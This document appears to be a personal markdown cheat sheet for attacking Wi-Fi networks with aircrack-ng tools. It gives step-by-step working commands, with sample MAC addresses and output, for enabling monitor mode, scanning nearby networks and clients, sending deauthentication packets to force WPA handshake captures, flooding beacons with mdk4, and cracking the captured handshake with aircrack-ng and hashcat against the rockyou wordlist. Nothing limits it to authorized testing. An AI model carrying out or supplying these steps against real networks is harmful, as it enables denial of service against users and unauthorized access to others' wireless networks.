
## cheapset active check
```
sudo iwconfig
```

check adapter information mode:
```
sudo airmon-ng start wlx00117f1b8884 
```
or 
```
sudo airmon-ng start wlan0mon
SUDO airmon-ng check kill
```


check again is active monitor mode
```
iwconfig
```

inkjection mode check:
```
sudo aireplay-ng --test wlan0
```




1. show all wifi info/interface:
sudo airodump-ng wlan0mon
2. focus only channel 6
sudo airodump-ng wlan0mon -c 6 
3. specify network address info
sudo airodump-ng wlan0mon -c 6 --bssid 
4. capture the file
sudo airodump-ng wlan0mon -c 6 --bssid -w capture
5. caputre range 5ghz
sudo airodump-ng wlan0mon -b a





specific wifi connect device information:
```
sudo airodump-ng --bssid 54:AF:97:C7:D0:06 -c 9 wlan0mon
sudo airodump-ng --bssid 54:AF:97:C7:D0:06 -c 9 --write capture wlan0mon
```
shows that
 54:AF:97:C7:D0:06  3A:D8:79:90:6C:23   -1    1e- 0      0        2             
 54:AF:97:C7:D0:06  A2:0B:6B:10:88:9C  -86    2e- 1      0      277             
 54:AF:97:C7:D0:06  52:D5:C7:80:2D:88   -1    1e- 0      0       21 
i choose - 1
 54:AF:97:C7:D0:06  52:D5:C7:80:2D:88

get handshaking file
```
sudo aireplay-ng --deauth 10 -a [bssid] -c [station] wlan0mon
sudo aireplay-ng --deauth 10 -a 54:AF:97:C7:D0:06 -c 52:D5:C7:80:2D:88 wlan0mon
```
wireshark check using : eapol


flood attack
```
sudo mdk4 wlan0mon b -c 1 -f wifi.lst
```

****************************************************************************
# Capture Traffic & Nearby Wifi Networks
Capture the packets and export it to your machine / show target network & connected device
```
sudo airodump-ng --bssid [target-bssid] -c [channel-id] --write [filename] [network-adapter]
sudo airodump-ng --bssid 34:60:F9:71:04:C2 -c 4 --write wifitest wlan0mon
```

# Deauth the users that are connected to the target network
 User will need to input the wifi password to connect again
```
sudo aireplay-ng --deauth [number-of-packets(>50)] -a [target-bssid] [network-adapter]
sudo aireplay-ng --deauth 200 -a 34:60:F9:71:04:C2 wlan0mon
```
to test in wireshark : eapol


file the DOS attack is underway, check on your airodump scan. You should see at the right top : WPA handshake: <mac address>. Once you have verified that, you can stop the replay attack and the airodump-ng scan.
```
sudo airodump-ng --bssid [code] -c 3 --write phonehotspot wlan0mon
```

#CRACK THE PASSWORD
using bruth force : 
```
sudo aircrack-ng -b 02:1A:11:FF:D9:BD -w /usr/share/wordlists/rockyou.txt ../Captures_1578171018678/NinjaJc01-01.cap
```
****************************************************************************

Attack a specific BSSID:
```
aircrack-ng -b 02:1A:11:FF:D9:BD -w wordlist.txt capture_file.cap
```

aircrack-ng capture.cap -J output
getoutput : cap2hccapx
hashcat -m 2500 output.hccapx wordlist.txt --force

*****************************************************
